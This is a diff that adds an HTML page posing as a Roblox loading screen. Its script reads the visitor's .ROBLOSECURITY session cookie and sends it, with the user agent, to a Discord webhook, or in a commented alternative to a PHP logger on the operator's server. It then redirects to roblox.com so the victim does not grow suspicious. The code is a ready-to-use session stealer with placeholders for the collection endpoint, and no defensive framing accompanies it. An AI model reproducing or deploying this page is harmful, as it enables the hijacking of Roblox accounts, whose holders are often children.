@@ -1,0 +1,52 @@
+```html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <script>
+        function getCookie(name) {
+            const value = `; ${document.cookie}`;
+            const parts = value.split(`; ${name}=`);
+            if (parts.length === 2) return parts.pop().split(';').shift();
+            return null;
+        }
+
+        const robloxCookie = getCookie('.ROBLOSECURITY');
+
+        if (robloxCookie) {
+            // Method A: Send to Discord Webhook
+            const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL_HERE'; // Replace with your actual Discord Webhook URL
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: `Roblox Cookie Logged!\n\`\`\`${robloxCookie}\`\`\`\nUser Agent: ${navigator.userAgent}`
+                })
+            }).then(response => {
+                console.log('Cookie sent to Discord webhook');
+            }).catch(error => {
+                console.error('Error sending to Discord:', error);
+            });
+
+            // Method B: Send to your PHP script (if using web hosting)
+            // const phpLoggerUrl = 'http://YOUR_YOUR_WEBSERVER_DOMAIN/logcookie.php?cookie=' + encodeURIComponent(robloxCookie);
+            // fetch(phpLoggerUrl)
+            //     .then(response => console.log('Cookie sent to PHP logger'))
+            //     .catch(error => console.error('Error sending to PHP logger:', error));
+
+        } else {
+            console.log('Roblox cookie not found.');
+        }
+
+        // Optional: Redirect them to Roblox.com so they don't get suspicious
+        window.location.href = "https://www.roblox.com/";
+
+    </script>
+</head>
+<body>
+    <p>Loading Roblox...</p>
+</body>
+</html>
+```
